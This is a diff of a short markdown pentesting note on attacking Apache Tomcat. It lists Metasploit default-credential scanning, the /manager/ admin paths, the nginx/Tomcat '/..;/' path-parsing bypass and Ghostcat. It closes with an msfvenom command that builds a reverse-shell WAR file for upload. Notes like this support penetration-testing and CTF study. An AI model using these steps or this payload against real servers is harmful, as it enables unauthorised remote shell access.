@@ -1,12 +1,19 @@
 # Apache Tomcat
 
+
+## Vulnerabilities and Enumaration
+
 Default password: metasploit module auxillary scanner! 
 
-nginx - tomcat look url parsing /..;/
+Administrator portal can host files
+`/manager/`
+`/manager-gui/`
 
-## Ghostcat
-/manager/
-/manager-gui/
+nginx - tomcat observe url parsing `/..;/`
+
+
+#### Ghostcat
+
 Upload should not necessarily require username and password
 ```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war -o shell.war
